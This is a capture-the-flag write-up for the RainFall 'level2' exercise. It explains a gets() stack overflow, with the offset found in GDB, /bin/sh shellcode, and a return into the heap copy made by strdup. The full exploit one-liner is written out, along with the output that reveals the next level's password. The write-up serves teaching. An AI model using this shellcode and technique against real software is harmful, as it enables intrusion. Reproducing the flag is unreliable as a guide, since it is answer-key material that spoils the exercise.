## level2
`level2` looks a lot like `level1`, if we run the executable found in this level it will pretty much as before wait for an input in the standart entry and then print it to the standard output, with no surprise when we examine the code with `GDB` we will find the `gets()` function within it.

The main is very simple, so we can even put it here:
```
   0x0804853f <+0>:	push   %ebp
   0x08048540 <+1>:	mov    %esp,%ebp
   0x08048542 <+3>:	and    $0xfffffff0,%esp
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
```
The `main()` just set the function prologue, call `p()` and returns, pretty simple right? but what's is going on in `p()` it's what we are interested on. <br>
**The function __p()__** contains the `gets()` function that we can try to use to exploit as before, unfortunately here there's no `system()` call to run any `shell` so here it will be our job to create a shell injection.
Let's fire gbd with the executable.<br>
`~$ gdb -q level2`<br>
Here we can `run` the program inside `GDB` and it will wait for the input, we already know that we need to find the `offset` for the return so let's go back again to: [buffer-over-flow-generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) and grab a random pattern and feed the program with this input<br>
```
(gdb) r
Starting program: /home/user/level2/level2
[pattern]
Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```
Now go back to __buffer-over-flow-generator__ and paste this address `0x37634136` in __Find the offset__ to get the offset value of `80`. <br> Here as mentioned above there is nowhere where a call to a executing the shell is made, so we will need to create it ourself.<br><br>
__Shell code__
`'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'`  source: [shell-storm](http://shell-storm.org/shellcode/files/shellcode-219.php) <br>Now that we have the code for executing the new shell `/bin/sh` lets prepare the payload to put right at the return of the `run()` function, we have found the __offset__ is `80 bytes` and our __shell code__ is only `24 bytes` long, we have *two* options to fill the remaining `56 bytes`, we can put any charater between the __shell code__ and the run() function __adddress__ or we can fill the first `56 bytes` with the `NOP` instruction, we will use the first aproach.<br>
We can see in the body of `p()` a check in the `eax` register where the return value from `gets()` is stored, if it starts with `0xb`it will print the __address__ and exit.
```
0x080484fb <+39>:	and    $0xb0000000,%eax
0x08048500 <+44>:	cmp    $0xb0000000,%eax
[...]
0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
```
We see down bellow a call to `<strdup@plt>` *(this functions is called to duplicate the input we gave to the program)* so the trick here is to put a break point at the __address__ just after the call of the `<strdup@plt>` function and get the __address__ contained in `eax` as the return of the function. <br> 
```
b *0x0804853d
Breakpoint 1 at 0x804853d
r
Starting program: /home/user/level2/level2
n
Breakpoint 1, 0x0804853d in p ()
(gdb) x/x $eax
0x804a008:	0x0000006e
```
And here we have the start __address__ for our payload *(remember the little end first)*
```
(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 56 * 'A'  + '\x08\xa0\x04\x08')"; cat) | /home/user/level2/level2
```
 And here we go
 ```
 level2@RainFall:~$ (python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 56 * 'A'  + '\x08\xa0\x04\x08')"; cat) | /home/user/level2/level2
1�Ph//shh/bin��PS�ᙰ
                    ̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 ```
